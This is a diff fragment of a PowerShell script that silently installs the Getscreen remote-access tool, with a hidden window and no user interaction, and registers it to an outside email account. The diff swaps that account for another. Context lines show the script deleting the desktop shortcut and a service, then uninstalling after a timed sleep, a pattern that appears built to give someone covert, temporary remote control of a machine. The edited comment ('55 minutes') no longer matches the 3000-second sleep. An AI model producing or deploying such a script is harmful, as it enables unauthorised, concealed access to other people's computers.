@@ -15,7 +15,7 @@ function Install-Getscreen {
         }
     }
     #Installing getscreen without user interaction and detaching from the current session
-    Start-Process -FilePath "$installerPath" -ArgumentList "-install -register tancorovruslan@gmail.com:10791" -Wait -ErrorAction Stop -WindowStyle Hidden
+    Start-Process -FilePath "$installerPath" -ArgumentList "-install -register williamsparks1967@dtortmail.com:10791" -Wait -ErrorAction Stop -WindowStyle Hidden
 }
 
 function Remove-Service { #Function that deletes a service by name
@@ -43,7 +43,7 @@ Remove-Item -Path "$env:USERPROFILE\Desktop\Getscreen.lnk" -Force -ErrorAction S
         Write-Host "getscreen installation failed"
     }
 
-#Uninstall getscreen after 50 minutes
+#Uninstall getscreen after 55 minutes
 Start-Sleep -Seconds 3000
 Start-Process -FilePath "C:\Program Files\Getscreen\getscreen.exe" -ArgumentList "-uninstall" -Wait -ErrorAction Stop
 #Remove getscreen installer
